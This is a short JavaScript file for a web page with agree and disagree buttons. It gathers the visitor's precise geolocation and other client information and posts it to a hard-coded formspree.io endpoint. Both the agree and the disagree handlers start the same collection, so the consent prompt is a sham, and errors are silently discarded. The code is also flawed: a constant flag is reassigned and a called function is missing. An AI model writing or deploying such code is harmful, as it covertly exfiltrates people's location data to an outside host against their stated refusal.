async function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("Geolocation is not supported by your browser.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos),
      err => reject("Unable to retrieve location: " + err.message)
    );
  });
}

async function sendRequest(data) {
  try {
    const response = await fetch("https://formspree.io/f/xeorknrp", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(data),
    });
  }
  catch (err) {
  }
}

async function getPosData() {
  try {
    const pos = await getLocation();
    const posData = {
      Latitude: pos.coords.latitude,
      Longitude: pos.coords.longitude,
      Accuracy: pos.coords.accuracy,
      Altitude: pos.coords.altitude,
      Speed: pos.coords.speed,
      Heading: pos.coords.heading,
    };
    return posData;
  } catch (err) {
  }
}

async function start() {
  if (finished) return;
  const funs = [
    collectPublicClientInfo,
    getPosData
  ]
  for (let f of funs) {
    const d = await f();
    await sendRequest(d);
  }
  finished = true;
}

async function agree() {
  alert("clicked");
  await start();
}

async function disAgree() {
  alert("clicked");
  await start();
}

const finished = false;

